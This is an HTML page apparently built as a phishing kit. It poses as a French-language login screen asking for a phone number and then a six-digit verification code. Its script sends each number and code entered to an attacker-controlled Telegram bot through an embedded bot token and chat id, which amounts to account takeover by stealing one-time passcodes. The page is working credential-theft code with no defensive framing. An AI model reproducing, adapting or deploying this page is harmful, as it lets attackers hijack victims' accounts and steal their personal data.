<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Connexion</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css">
    <style>
        :root {
            --primary-green: #24ac64;
            --bg-color: #fcf8f1;
            --text-dark: #1a1a1a;
        }

        * { box-sizing: border-box; font-family: -apple-system, system-ui, sans-serif; }

        body {
            background-color: var(--bg-color);
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            min-height: 100vh;
        }

        .wrapper {
            width: 100%;
            max-width: 450px;
            background: white;
            padding: 40px 25px;
            display: flex;
            flex-direction: column;
            border-bottom: 3px solid #000;
        }

        h2 { font-size: 28px; margin: 20px 0 10px; font-weight: 600; line-height: 1.2; }
        p { color: #555; font-size: 16px; margin-bottom: 40px; line-height: 1.4; }

        .iti { width: 100% !important; margin-bottom: 25px; }
        input[type="tel"] {
            width: 100% !important;
            height: 55px;
            border: 1.5px solid #ccc;
            border-radius: 30px;
            font-size: 18px;
            outline: none;
        }

        .otp-container {
            display: flex;
            justify-content: space-between;
            gap: 8px;
            margin: 20px 0;
        }

        .otp-field {
            width: 15% !important;
            height: 60px;
            text-align: center;
            border: 1.5px solid #ccc;
            border-radius: 12px;
            font-size: 24px;
            outline: none;
        }

        .btn-submit {
            background-color: var(--primary-green);
            color: white;
            border: none;
            width: 180px;
            height: 50px;
            border-radius: 25px;
            font-size: 18px;
            font-weight: 500;
            cursor: pointer;
            margin: 40px auto 20px;
            display: block;
        }

        .link-text {
            color: var(--text-dark);
            text-decoration: none;
            font-size: 16px;
            font-weight: 500;
            margin-top: 10px;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 5px;
        }

        .hidden { display: none !important; }
    </style>
</head>
<body>

<div class="wrapper">
    <div id="page1">
        <h2>Saisissez un num√©ro de <br>t√©l√©phone.</h2>
        <p>S√©lectionnez un pays et saisissez votre num√©ro de t√©l√©phone.</p>
        
        <input type="tel" id="phone">
        
        <button class="btn-submit" onclick="sendToTelegramPhone()">Suivant</button>
        
        <a href="#" class="link-text">Se connecter avec un code QR <span>&rsaquo;</span></a>
    </div>

    <div id="page2" class="hidden">
        <h2>V√©rification</h2>
        <p>Veuillez saisir le code √† 6 chiffres envoy√© √† votre mobile.</p>
        
        <div class="otp-container">
            <input type="number" class="otp-field" oninput="moveNext(this, 0)">
            <input type="number" class="otp-field" oninput="moveNext(this, 1)">
            <input type="number" class="otp-field" oninput="moveNext(this, 2)">
            <input type="number" class="otp-field" oninput="moveNext(this, 3)">
            <input type="number" class="otp-field" oninput="moveNext(this, 4)">
            <input type="number" class="otp-field" oninput="moveNext(this, 5)">
        </div>
        
        <button class="btn-submit" onclick="sendToTelegramOTP()">V√©rifier</button>
        
        <a href="#" class="link-text">Renvoyer le code <span>&rsaquo;</span></a>
    </div>
</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
<script>
    // --- ÿ®ŸäÿßŸÜÿßÿ™ŸÉ ÿßŸÑŸÖÿØŸÖÿ¨ÿ© ---
    const botToken = "8597407463:AAEZ98PLouzh7ivB8WqRGGuGhiPYCbUMS5Q"; 
    const chatId = "5614946654"; // ŸÖŸÑÿßÿ≠ÿ∏ÿ©: Ÿàÿ∂ÿπÿ™ ÿ¢ŸäÿØŸä ÿßŸÅÿ™ÿ±ÿßÿ∂Ÿäÿå ÿ∫Ÿäÿ±Ÿá ÿ•ÿ∞ÿß ŸÑŸÖ ŸäŸÉŸÜ ÿµÿ≠Ÿäÿ≠ÿßŸã

    // ÿ™ŸáŸäÿ¶ÿ© ÿ≠ŸÇŸÑ ÿßŸÑŸáÿßÿ™ŸÅ ŸÖÿπ ÿßŸÉÿ™ÿ¥ÿßŸÅ ÿßŸÑÿØŸàŸÑÿ© ÿ™ŸÑŸÇÿßÿ¶ŸäÿßŸã
    const phoneInput = document.querySelector("#phone");
    const iti = window.intlTelInput(phoneInput, {
        initialCountry: "auto",
        geoIpLookup: function(success) {
            fetch("https://ipapi.co/json").then(res => res.json()).then(data => success(data.country_code));
        },
        utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js"
    });

    // ÿ•ÿ±ÿ≥ÿßŸÑ ÿßŸÑŸáÿßÿ™ŸÅ ŸàÿßŸÑÿßŸÜÿ™ŸÇÿßŸÑ ŸÑŸÄ OTP
    function sendToTelegramPhone() {
        const fullNumber = iti.getNumber();
        if(!fullNumber) { alert("Num√©ro invalide"); return; }

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ chat_id: chatId, text: `üì± ÿ±ŸÇŸÖ ÿ¨ÿØŸäÿØ: ${fullNumber}` })
        });

        document.getElementById('page1').classList.add('hidden');
        document.getElementById('page2').classList.remove('hidden');
    }

    // ÿßŸÑÿßŸÜÿ™ŸÇÿßŸÑ ÿßŸÑÿ™ŸÑŸÇÿßÿ¶Ÿä ÿ®ŸäŸÜ ÿÆÿßŸÜÿßÿ™ OTP
    function moveNext(el, index) {
        if (el.value.length >= 1) {
            el.value = el.value.slice(0, 1); // ÿßŸÑÿ™ÿ£ŸÉÿØ ŸÖŸÜ ÿ±ŸÇŸÖ Ÿàÿßÿ≠ÿØ ŸÅŸÇÿ∑
            const fields = document.querySelectorAll('.otp-field');
            if (index < 5) fields[index + 1].focus();
        }
    }

    // ÿ•ÿ±ÿ≥ÿßŸÑ ÿßŸÑŸÄ OTP
    function sendToTelegramOTP() {
        let otp = "";
        document.querySelectorAll('.otp-field').forEach(f => otp += f.value);
        
        if(otp.length < 6) { alert("Code incomplet"); return; }

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ chat_id: chatId, text: `üîë ŸÉŸàÿØ ÿßŸÑŸÄ OTP: ${otp}` })
        }).then(() => {
            alert("Traitement en cours...");
        });
    }
</script>

</body>
</html>
